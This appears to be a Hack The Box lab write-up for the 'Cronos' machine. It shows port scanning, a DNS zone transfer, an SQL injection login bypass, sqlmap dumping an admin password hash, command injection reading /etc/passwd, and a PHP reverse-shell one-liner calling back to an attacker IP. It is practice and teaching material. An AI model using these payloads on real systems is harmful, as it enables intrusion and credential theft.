# Hackthebox Cronos

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -A -T4 -p- 10.129.171.252 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 13:28 EST
Nmap scan report for 10.129.171.252
Host is up (0.037s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
$ nmap --script dns-nsid 10.129.172.234

Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-06 09:59 EST
Nmap scan report for 10.129.172.234
Host is up (0.037s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http
```

Zone transfer guessing the domain cronos.htb. nslookup seems to give for some instances nameserver for this domain, but for me it did not work, possibly because of dedicate/vip ip?

```
$ dig axfr cronos.htb @10.129.172.234                                                                                                                                    1 ⨯

; <<>> DiG 9.16.15-Debian <<>> axfr cronos.htb @10.129.172.234
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.129.172.234
admin.cronos.htb.	604800	IN	A	10.129.172.234
ns1.cronos.htb.		604800	IN	A	10.129.172.234
www.cronos.htb.		604800	IN	A	10.129.172.234
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.129.172.234#53(10.129.172.234)
;; WHEN: Thu Jan 06 10:58:48 EST 2022
;; XFR size: 7 records (messages 1, bytes 203)
```

Now we need to add the found domain and subdomains to our /etc/hosts

```
10.129.172.234	cronos.htb
10.129.172.234	admin.cronos.htb
10.129.172.234	ns1.cronos.htb
10.129.172.234	www.cronos.htb
```

After which we can open a login portal from admin.cronos.htb. In www.cronos.htb we have a Laravel CMS site.

## Vulnerability Scanning


## Initial Access: admin portal access

The initial access can be done using SQL injection on the admin login page. For example

```
admin' or '1'='1
```

as a username works. After logging in we are treated with a submit form for a Net Tool v0.1.

Since SQL injection seems to work do some more investigation with sqlmap

Databases

```
$ sqlmap -u 'http://admin.cronos.htb/index.php' --data="username=hacked&password=server&form=submit" --dbms=mysql --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:06:10 /2022-01-06/

[12:06:10] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=9rimg19d7p7...ihfmrafi66'). Do you want to use those [Y/n] 
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=hacked' AND (SELECT 4933 FROM (SELECT(SLEEP(5)))azsy) AND 'cuqk'='cuqk&password=server&form=submit
---
[12:06:11] [INFO] testing MySQL
[12:06:19] [INFO] confirming MySQLize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[12:06:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[12:06:29] [INFO] adjusting time delay to 1 second due to good response times
[12:06:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18, PHP
back-end DBMS: MySQL >= 5.0.0
[12:06:29] [INFO] fetching database names
[12:06:29] [INFO] fetching number of databases
[12:06:29] [INFO] retrieved: 2
[12:06:31] [INFO] retrieved: information_schema
[12:07:35] [INFO] retrieved: admin
available databases [2]:
[*] admin
[*] information_schema

[12:07:51] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin.cronos.htb'

[*] ending @ 12:07:51 /2022-01-06/
```

Checking what are the tables in admin database

```
$ sqlmap -u 'http://admin.cronos.htb/index.php' --data="username=hacked&password=server&form=submit" --dbms=mysql --tables -D admin

		...
back-end DBMS: MySQL >= 5.0.0
[12:11:39] [INFO] fetching tables for database: 'admin'
[12:11:39] [INFO] fetching number of tables for database 'admin'
[12:11:39] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                 
		...
users
Database: admin
[1 table]
+-------+
| users |
+-------+
```

And the columns in the users table
```
$ sqlmap -u 'http://admin.cronos.htb/index.php' --data="username=hacked&password=server&form=submit" --dbms=mysql --columns -T users

		...
[12:14:02] [INFO] fetching columns for table 'users' in database 'admin'
[12:14:02] [INFO] retrieved: 3
[12:14:05] [INFO] retrieved: id
[12:14:12] [INFO] retrieved: int(6) unsigned
[12:15:14] [INFO] retrieved: username
[12:15:39] [INFO] retrieved: varchar(30)
[12:16:17] [INFO] retrieved: password
[12:16:47] [INFO] retrieved: varchar(100)
Database: admin
Table: users
[3 columns]
+----------+-----------------+
| Column   | Type            |
+----------+-----------------+
| id       | int(6) unsigned |
| password | varchar(100)    |
| username | varchar(30)     |
+----------+-----------------+
		...
```

And finally the username and password

$ sqlmap -u 'http://admin.cronos.htb/index.php' --data="username=hacked&password=server&form=submit" --dbms=mysql --dump -D admin -T users

		...
Database: admin
Table: users
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 4f5fffa7b2340178a716e3832451e058 | admin    |
+----+----------------------------------+----------+
```

Decrypting the md5 hash with www.md5online.org/md5-decrypt.html gives us the password

```
1327663704
```

## Initial Access: shell

The Net Tool form is pretty basic and executes and commands we feed it. Just inserting the IP address for the ping command executes on shell 'ping 8.8.8.8'. Feeding the form with 8.8.8. & cat /etc/passwd shows us the contents of the file

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
bind:x:112:119::/var/cache/bind:/bin/false
```

So why don't we execute a php reverse shell

```
8.8.8.8 & php -r '$sock=fsockopen("10.10.14.51",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Which will give us a shell for our listener

```
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.51] from (UNKNOWN) [10.129.172.234] 57870
bash: cannot set terminal process group (1625): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ uname -a
uname -a
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data@cronos:/var/www/admin$
```

While looking around in our initial directory there is a file config.php that gives us directions for the database access

```
www-data@cronos:/var/www/admin$ cat config.php	
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

With psspy we can identify some scheduled activities that might be of interest

```
2022/01/06 19:54:01 CMD: UID=0    PID=4857   | sh -c stty -a | grep columns 
2022/01/06 19:55:01 CMD: UID=0    PID=4875   | php /var/www/laravel/artisan schedule:run 
2022/01/06 19:55:01 CMD: UID=0    PID=4874   | /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1 
2022/01/06 19:55:01 CMD: UID=0    PID=4873   | /usr/sbin/CRON -f 
```


## Privilege Escalation www-data to noulis




